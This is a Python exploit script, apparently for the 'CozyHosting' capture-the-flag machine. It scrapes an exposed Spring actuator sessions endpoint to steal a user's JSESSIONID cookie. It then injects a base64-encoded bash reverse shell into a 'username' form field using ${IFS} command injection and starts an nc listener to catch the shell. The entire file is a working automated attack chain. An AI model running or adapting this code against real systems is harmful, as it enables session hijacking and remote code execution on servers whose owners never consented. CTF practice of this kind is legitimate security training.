import requests
import subprocess
from bs4 import BeautifulSoup
from soup2dict import convert
import simplejson
import json
import pyfiglet
from termcolor import colored

font = pyfiglet.Figlet(font='slant')
print(colored(font.renderText('CozyHosting'),'red'))

print(" "*38,"BY BigyanKalakheti",)
print("[+] Github: https://github.com/BigyanKalakheti\n")

try:
    url1 = "http://cozyhosting.htb/actuator/sessions"
    r = requests.get(url1)
    r.raise_for_status()  # Check for HTTP errors

    soup = BeautifulSoup(r.content, "html.parser")
    soup_dict = convert(soup)
    keys = soup_dict.values()

    with open('output.json', 'w') as output_file:
        output_file.write(
            simplejson.dumps(soup_dict, indent=2),
        )

    # Load data from the JSON file
    with open('output.json', 'r') as file:
        data = json.load(file)

    # Get the list of navigable strings
    navigable_strings = data.get('navigablestring', [])

    # Initialize an empty list to store keys associated with "kanderson"
    keys_for_value = []

    # Iterate through navigable strings and find keys for "kanderson"
    for string_data in navigable_strings:
        try:
            string_dict = json.loads(string_data)
            keys_for_value.extend([key for key, value in string_dict.items() if value == "kanderson"])
        except json.JSONDecodeError:
            print("Error decoding JSON in navigable_strings")

    print("JSESSIONID for'kanderson': ", keys_for_value)
    your_ip = input("Enter your IP address : ")
    your_port = input("Enter port number : ")

    # Construct the command
    command = f'echo "bash -i >& /dev/tcp/{your_ip}/{your_port} 0>&1" | base64'

    # Run the command and capture the output
    output = subprocess.check_output(command, shell=True, text=True)
    result = output.strip()
    payload_command = f';echo${{IFS}}"{result}"${{IFS}}|${{IFS}}base64${{IFS}}-d${{IFS}}|${{IFS}}bash;'

    JSESSIONID = keys_for_value[0]

    # Construct the headers
    headers = {
        'Cookie': f'JSESSIONID={JSESSIONID}',
    }
    # Construct the data
    data = {
        'host': '127.0.0.1',
        'username': payload_command,
    }
    print(f"Using Payload : \"{data['username']}\"","\n")
    command = f'nc -lnvp {your_port}'
    subprocess.Popen(command, shell=True)

    url = 'http://cozyhosting.htb/executessh'
    response = requests.post(url, headers=headers, data=data)
    response.raise_for_status()  # Check for HTTP errors

    print(response.text)

    command = f'fg'
    subprocess.Popen(command, shell=True)

except requests.RequestException as req_err:
    print(f"Error with the request: {req_err}")
except subprocess.CalledProcessError as sub_err:
    print(f"Error with subprocess: {sub_err}")
except KeyboardInterrupt:
    print("user terminated: ")    
except Exception as e:
    print(f"An unexpected error occurred: {e}")
